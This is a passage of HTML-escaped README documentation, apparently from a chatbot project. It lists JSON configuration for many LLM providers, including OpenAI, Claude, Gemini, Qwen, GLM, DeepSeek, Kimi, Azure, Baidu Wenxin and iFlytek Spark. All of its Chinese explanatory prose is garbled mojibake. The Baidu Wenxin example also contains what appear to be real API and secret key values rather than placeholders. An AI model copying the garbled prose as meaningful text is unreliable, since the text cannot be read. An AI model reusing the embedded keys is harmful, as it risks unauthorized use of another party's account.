  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ‰∏éOpenAIÊé•Âè£ÁöÑ &lt;a href="https://platform.openai.com/docs/models"&gt;modelÂèÇÊï∞&lt;/a&gt; ‰∏ÄËá¥ÔºåÊîØÊåÅÂåÖÊã¨ oÁ≥ªÂàó„ÄÅgpt-5.2„ÄÅgpt-5.1„ÄÅgpt-4.1Á≠âÁ≥ªÂàóÊ®°Âûã&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: Â¶ÇÊûúÈúÄË¶ÅÊé•ÂÖ•Á¨¨‰∏âÊñπ‰ª£ÁêÜÊé•Âè£ÔºåÂèØÈÄöËøá‰øÆÊîπËØ•ÂèÇÊï∞ËøõË°åÊé•ÂÖ•&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: ‰ΩøÁî®OpenAIÁõ∏ÂÖ≥Ê®°ÂûãÊó∂Êó†ÈúÄÂ°´ÂÜô„ÄÇÂΩì‰ΩøÁî®Á¨¨‰∏âÊñπ‰ª£ÁêÜÊé•Âè£Êé•ÂÖ•ClaudeÁ≠âÈùûOpenAIÂÆòÊñπÊ®°ÂûãÊó∂ÔºåËØ•ÂèÇÊï∞ËÆæ‰∏∫ &lt;code&gt;chatGPT&lt;/code&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;LinkAI&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://link-ai.tech/console/interface"&gt;LinkAIÂπ≥Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Â°´ÂÜôÈÖçÁΩÆ&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "use_linkai": true,
    "linkai_api_key": "YOUR API KEY",
    "linkai_app_code": "YOUR APP CODE"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;use_linkai&lt;/code&gt;: ÊòØÂê¶‰ΩøÁî®LinkAIÊé•Âè£ÔºåÈªòËÆ§ÂÖ≥Èó≠ÔºåËÆæÁΩÆ‰∏∫trueÂêéÂèØÂØπÊé•LinkAIÂπ≥Âè∞ÁöÑÊô∫ËÉΩ‰ΩìÔºå‰ΩøÁî®Áü•ËØÜÂ∫ì„ÄÅÂ∑•‰ΩúÊµÅ„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅMCPÊèí‰ª∂Á≠â‰∏∞ÂØåÁöÑAgentËÉΩÂäõ&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;linkai_api_key&lt;/code&gt;: LinkAIÂπ≥Âè∞ÁöÑAPI KeyÔºåÂèØÂú® &lt;a href="https://link-ai.tech/console/interface"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ‰∏≠ÂàõÂª∫&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;linkai_app_code&lt;/code&gt;: LinkAIÊô∫ËÉΩ‰Ωì (Â∫îÁî®ÊàñÂ∑•‰ΩúÊµÅ) ÁöÑcodeÔºåÈÄâÂ°´ÔºåÊôÆÈÄöÂØπËØùÊ®°ÂºèÂèØÁî®„ÄÇÊô∫ËÉΩ‰ΩìÂàõÂª∫ÂèØÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/platform/quick-start"&gt;ËØ¥ÊòéÊñáÊ°£&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: modelÂ≠óÊÆµÂ°´ÂÜôÁ©∫ÂàôÁõ¥Êé•‰ΩøÁî®Êô∫ËÉΩ‰ΩìÁöÑÊ®°ÂûãÔºåÂèØÂú®Âπ≥Âè∞‰∏≠ÁÅµÊ¥ªÂàáÊç¢Ôºå&lt;a href="https://link-ai.tech/console/models"&gt;Ê®°ÂûãÂàóË°®&lt;/a&gt;‰∏≠ÁöÑÂÖ®ÈÉ®Ê®°ÂûãÂùáÂèØ‰ΩøÁî®&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;MiniMax&lt;/summary&gt; 
 &lt;p&gt;ÊñπÂºè‰∏ÄÔºöÂÆòÊñπÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ã(Êé®Ëçê)Ôºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "MiniMax-M2.1",
    "minimax_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;MiniMax-M2.1„ÄÅMiniMax-M2.1-lightning„ÄÅMiniMax-M2„ÄÅabab6.5-chat&lt;/code&gt; Á≠â&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;minimax_api_key&lt;/code&gt;ÔºöMiniMaxÂπ≥Âè∞ÁöÑAPI-KEYÔºåÂú® &lt;a href="https://platform.minimaxi.com/user-center/basic-information/interface-key"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "MiniMax-M2.1",
  "open_ai_api_base": "https://api.minimaxi.com/v1",
  "open_ai_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ &lt;code&gt;MiniMax-M2.1„ÄÅMiniMax-M2.1-lightning„ÄÅMiniMax-M2&lt;/code&gt;ÔºåÂèÇËÄÉ&lt;a href="https://platform.minimaxi.com/document/%E5%AF%B9%E8%AF%9D?key=66701d281d57f38758d581d0#QklxsNSbaf6kM4j6wjO5eEek"&gt;APIÊñáÊ°£&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: MiniMaxÂπ≥Âè∞APIÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: MiniMaxÂπ≥Âè∞ÁöÑAPI-KEY&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;Êô∫Ë∞±AI (GLM)&lt;/summary&gt; 
 &lt;p&gt;ÊñπÂºè‰∏ÄÔºöÂÆòÊñπÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ã(Êé®Ëçê)Ôºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "model": "glm-4.7",
  "zhipu_ai_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ &lt;code&gt;glm-4.7„ÄÅglm-4-plus„ÄÅglm-4-flash„ÄÅglm-4-air„ÄÅglm-4-airx„ÄÅglm-4-long&lt;/code&gt; Á≠â, ÂèÇËÄÉ &lt;a href="https://bigmodel.cn/dev/api/normal-model/glm-4"&gt;glm-4Á≥ªÂàóÊ®°ÂûãÁºñÁ†Å&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;zhipu_ai_api_key&lt;/code&gt;: Êô∫Ë∞±AIÂπ≥Âè∞ÁöÑ API KEYÔºåÂú® &lt;a href="https://www.bigmodel.cn/usercenter/proj-mgmt/apikeys"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "glm-4.7",
  "open_ai_api_base": "https://open.bigmodel.cn/api/paas/v4",
  "open_ai_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ &lt;code&gt;glm-4.7„ÄÅglm-4.6„ÄÅglm-4-plus„ÄÅglm-4-flash„ÄÅglm-4-air„ÄÅglm-4-airx„ÄÅglm-4-long&lt;/code&gt; Á≠â&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: Êô∫Ë∞±AIÂπ≥Âè∞ÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: Êô∫Ë∞±AIÂπ≥Âè∞ÁöÑ API KEY&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;ÈÄö‰πâÂçÉÈóÆ (Qwen)&lt;/summary&gt; 
 &lt;p&gt;ÊñπÂºè‰∏ÄÔºöÂÆòÊñπSDKÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ã(Êé®Ëçê)Ôºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "qwen3-max",
    "dashscope_api_key": "sk-qVxxxxG"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;qwen3-max„ÄÅqwen-max„ÄÅqwen-plus„ÄÅqwen-turbo„ÄÅqwen-long„ÄÅqwq-plus&lt;/code&gt; Á≠â&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;dashscope_api_key&lt;/code&gt;: ÈÄö‰πâÂçÉÈóÆÁöÑ API-KEYÔºåÂèÇËÄÉ &lt;a href="https://bailian.console.aliyun.com/?tab=api#/api"&gt;ÂÆòÊñπÊñáÊ°£&lt;/a&gt; ÔºåÂú® &lt;a href="https://bailian.console.aliyun.com/?tab=model#/api-key"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "qwen3-max",
  "open_ai_api_base": "https://dashscope.aliyuncs.com/compatible-mode/v1",
  "open_ai_api_key": "sk-qVxxxxG"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÊîØÊåÅÂÆòÊñπÊâÄÊúâÊ®°ÂûãÔºåÂèÇËÄÉ&lt;a href="https://help.aliyun.com/zh/model-studio/models?spm=a2c4g.11186623.0.0.78d84823Kth5on#9f8890ce29g5u"&gt;Ê®°ÂûãÂàóË°®&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: ÈÄö‰πâÂçÉÈóÆAPIÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: ÈÄö‰πâÂçÉÈóÆÁöÑ API-KEY&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;Claude&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://console.anthropic.com/settings/keys"&gt;ClaudeÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Â°´ÂÜôÈÖçÁΩÆ&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "claude-sonnet-4-5",
    "claude_api_key": "YOUR_API_KEY"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèÇËÄÉ &lt;a href="https://docs.anthropic.com/en/docs/about-claude/models/overview#model-aliases"&gt;ÂÆòÊñπÊ®°ÂûãID&lt;/a&gt; ÔºåÊîØÊåÅ &lt;code&gt;claude-sonnet-4-5„ÄÅclaude-sonnet-4-0„ÄÅclaude-opus-4-0„ÄÅclaude-3-5-sonnet-latest&lt;/code&gt; Á≠â&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;Gemini&lt;/summary&gt; 
 &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://aistudio.google.com/app/apikey?hl=zh-cn"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫API Key ÔºåÈÖçÁΩÆÂ¶Ç‰∏ã&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "gemini-3-flash-preview",
    "gemini_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèÇËÄÉ&lt;a href="https://ai.google.dev/gemini-api/docs/models?hl=zh-cn"&gt;ÂÆòÊñπÊñáÊ°£-Ê®°ÂûãÂàóË°®&lt;/a&gt;ÔºåÊîØÊåÅ &lt;code&gt;gemini-3-flash-preview„ÄÅgemini-3-pro-preview„ÄÅgemini-2.5-pro„ÄÅgemini-2.0-flash&lt;/code&gt; Á≠â&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;DeepSeek&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://platform.deepseek.com/api_keys"&gt;DeepSeekÂπ≥Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Â°´ÂÜôÈÖçÁΩÆ&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "deepseek-chat",
    "open_ai_api_key": "sk-xxxxxxxxxxx",
    "open_ai_api_base": "https://api.deepseek.com/v1", 
    "bot_type": "chatGPT"

}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ &lt;code&gt;deepseek-chat„ÄÅdeepseek-reasoner&lt;/code&gt;ÔºåÂàÜÂà´ÂØπÂ∫îÁöÑÊòØ DeepSeek-V3 Âíå DeepSeek-R1 Ê®°Âûã&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: DeepSeekÂπ≥Âè∞ÁöÑ API Key&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: DeepSeekÂπ≥Âè∞ BASE URL&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;Kimi (Moonshot)&lt;/summary&gt; 
 &lt;p&gt;ÊñπÂºè‰∏ÄÔºöÂÆòÊñπÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "moonshot-v1-128k",
    "moonshot_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;moonshot-v1-8k„ÄÅmoonshot-v1-32k„ÄÅmoonshot-v1-128k&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;moonshot_api_key&lt;/code&gt;: MoonshotÁöÑAPI-KEYÔºåÂú® &lt;a href="https://platform.moonshot.cn/console/api-keys"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "moonshot-v1-128k",
  "open_ai_api_base": "https://api.moonshot.cn/v1",
  "open_ai_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;moonshot-v1-8k„ÄÅmoonshot-v1-32k„ÄÅmoonshot-v1-128k&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: MoonshotÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: MoonshotÁöÑ API-KEY&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;Azure&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;API KeyÂàõÂª∫ÔºöÂú® &lt;a href="https://oai.azure.com/"&gt;AzureÂπ≥Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Â°´ÂÜôÈÖçÁΩÆ&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "model": "",
  "use_azure_chatgpt": true,
  "open_ai_api_key": "",
  "open_ai_api_base": "",
  "azure_deployment_id": "",
  "azure_api_version": "2025-01-01-preview"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÁïôÁ©∫Âç≥ÂèØ&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;use_azure_chatgpt&lt;/code&gt;: ËÆæ‰∏∫ true&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: AzureÂπ≥Âè∞ÁöÑÂØÜÈí•&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: AzureÂπ≥Âè∞ÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;azure_deployment_id&lt;/code&gt;: AzureÂπ≥Âè∞ÈÉ®ÁΩ≤ÁöÑÊ®°ÂûãÂêçÁß∞&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;azure_api_version&lt;/code&gt;: apiÁâàÊú¨‰ª•Âèä‰ª•‰∏äÂèÇÊï∞ÂèØ‰ª•Âú®ÈÉ®ÁΩ≤ÁöÑ &lt;a href="https://oai.azure.com/resource/deployments"&gt;Ê®°ÂûãÈÖçÁΩÆ&lt;/a&gt; ÁïåÈù¢Êü•Áúã&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;ÁôæÂ∫¶ÊñáÂøÉ&lt;/summary&gt; ÊñπÂºè‰∏ÄÔºöÂÆòÊñπSDKÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
    "model": "wenxin-4", 
    "baidu_wenxin_api_key": "IajztZ0bDxgnP9bEykU7lBer",
    "baidu_wenxin_secret_key": "EDPZn6L24uAS9d8RWFfotK47dPvkjD6G"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ &lt;code&gt;wenxin&lt;/code&gt;Âíå&lt;code&gt;wenxin-4&lt;/code&gt;ÔºåÂØπÂ∫îÊ®°Âûã‰∏∫ ÊñáÂøÉ-3.5 Âíå ÊñáÂøÉ-4.0&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;baidu_wenxin_api_key&lt;/code&gt;ÔºöÂèÇËÄÉ &lt;a href="https://cloud.baidu.com/doc/WENXINWORKSHOP/s/dlv4pct3s"&gt;ÂçÉÂ∏ÜÂπ≥Âè∞-access_tokenÈâ¥ÊùÉ&lt;/a&gt; ÊñáÊ°£Ëé∑Âèñ API Key&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;baidu_wenxin_secret_key&lt;/code&gt;ÔºöÂèÇËÄÉ &lt;a href="https://cloud.baidu.com/doc/WENXINWORKSHOP/s/dlv4pct3s"&gt;ÂçÉÂ∏ÜÂπ≥Âè∞-access_tokenÈâ¥ÊùÉ&lt;/a&gt; ÊñáÊ°£Ëé∑Âèñ Secret Key&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "ERNIE-4.0-Turbo-8K",
  "open_ai_api_base": "https://qianfan.baidubce.com/v2",
  "open_ai_api_key": "bce-v3/ALTxxxxxxd2b"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÊîØÊåÅÂÆòÊñπÊâÄÊúâÊ®°ÂûãÔºåÂèÇËÄÉ&lt;a href="https://cloud.baidu.com/doc/WENXINWORKSHOP/s/Wm9cvy6rl"&gt;Ê®°ÂûãÂàóË°®&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: ÁôæÂ∫¶ÊñáÂøÉAPIÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: ÁôæÂ∫¶ÊñáÂøÉÁöÑ API-KEYÔºåÂèÇËÄÉ &lt;a href="https://cloud.baidu.com/doc/qianfan-api/s/ym9chdsy5"&gt;ÂÆòÊñπÊñáÊ°£&lt;/a&gt; ÔºåÂú® &lt;a href="https://console.bce.baidu.com/iam/#/iam/apikey/list"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫API Key&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;ËÆØÈ£ûÊòüÁÅ´&lt;/summary&gt; 
 &lt;p&gt;ÊñπÂºè‰∏ÄÔºöÂÆòÊñπÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö ÂèÇËÄÉ &lt;a href="https://www.xfyun.cn/doc/platform/quickguide.html#%E7%AC%AC%E4%BA%8C%E6%AD%A5-%E5%88%9B%E5%BB%BA%E6%82%A8%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8-%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8%E6%9C%8D%E5%8A%A1"&gt;ÂÆòÊñπÊñáÊ°£-Âø´ÈÄüÊåáÂºï&lt;/a&gt; Ëé∑Âèñ &lt;code&gt;APPID„ÄÅ APISecret„ÄÅ APIKey&lt;/code&gt; ‰∏â‰∏™ÂèÇÊï∞&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "model": "xunfei",
  "xunfei_app_id": "",
  "xunfei_api_key": "",
  "xunfei_api_secret": "",
  "xunfei_domain": "4.0Ultra",
  "xunfei_spark_url": "wss://spark-api.xf-yun.com/v4.0/chat"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: Â°´ &lt;code&gt;xunfei&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;xunfei_domain&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;4.0Ultra„ÄÅgeneralv3.5„ÄÅmax-32k„ÄÅgeneralv3„ÄÅpro-128k„ÄÅlite&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;xunfei_spark_url&lt;/code&gt;: Â°´ÂÜôÂèÇËÄÉ &lt;a href="https://www.xfyun.cn/doc/spark/Web.html#_1-1-%E8%AF%B7%E6%B1%82%E5%9C%B0%E5%9D%80"&gt;ÂÆòÊñπÊñáÊ°£-ËØ∑Ê±ÇÂú∞ÂùÄ&lt;/a&gt; ÁöÑËØ¥Êòé&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;ÊñπÂºè‰∫åÔºöOpenAIÂÖºÂÆπÊñπÂºèÊé•ÂÖ•ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "chatGPT",
  "model": "4.0Ultra",
  "open_ai_api_base": "https://spark-api-open.xf-yun.com/v1",
  "open_ai_api_key": ""
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: OpenAIÂÖºÂÆπÊñπÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèØÂ°´ÂÜô &lt;code&gt;4.0Ultra„ÄÅgeneralv3.5„ÄÅmax-32k„ÄÅgeneralv3„ÄÅpro-128k„ÄÅlite&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_base&lt;/code&gt;: ËÆØÈ£ûÊòüÁÅ´Âπ≥Âè∞ÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;open_ai_api_key&lt;/code&gt;: ËÆØÈ£ûÊòüÁÅ´Âπ≥Âè∞ÁöÑ&lt;a href="https://console.xfyun.cn/services/bm3"&gt;APIPassword&lt;/a&gt; ÔºåÂõ†Ê®°ÂûãËÄåÂ∑≤&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;ModelScope&lt;/summary&gt; 
 &lt;pre&gt;&lt;code class="language-json"&gt;{
  "bot_type": "modelscope",
  "model": "Qwen/QwQ-32B",
  "modelscope_api_key": "your_api_key",
  "modelscope_base_url": "https://api-inference.modelscope.cn/v1/chat/completions",
  "text_to_image": "MusePublic/489_ckpt_FLUX_1"
}
&lt;/code&gt;&lt;/pre&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;bot_type&lt;/code&gt;: modelscopeÊé•Âè£Ê†ºÂºè&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: ÂèÇËÄÉ&lt;a href="https://www.modelscope.cn/models?filter=inference_type&amp;amp;page=1"&gt;Ê®°ÂûãÂàóË°®&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;modelscope_api_key&lt;/code&gt;: ÂèÇËÄÉ &lt;a href="https://modelscope.cn/docs/accounts/token"&gt;ÂÆòÊñπÊñáÊ°£-ËÆøÈóÆ‰ª§Áâå&lt;/a&gt; ÔºåÂú® &lt;a href="https://modelscope.cn/my/myaccesstoken"&gt;ÊéßÂà∂Âè∞&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;modelscope_base_url&lt;/code&gt;: modelscopeÂπ≥Âè∞ÁöÑ BASE URL&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;text_to_image&lt;/code&gt;: ÂõæÂÉèÁîüÊàêÊ®°ÂûãÔºåÂèÇËÄÉ&lt;a href="https://www.modelscope.cn/models?filter=inference_type&amp;amp;page=1"&gt;Ê®°ÂûãÂàóË°®&lt;/a&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;h2&gt;ÈÄöÈÅìËØ¥Êòé&lt;/h2&gt; 
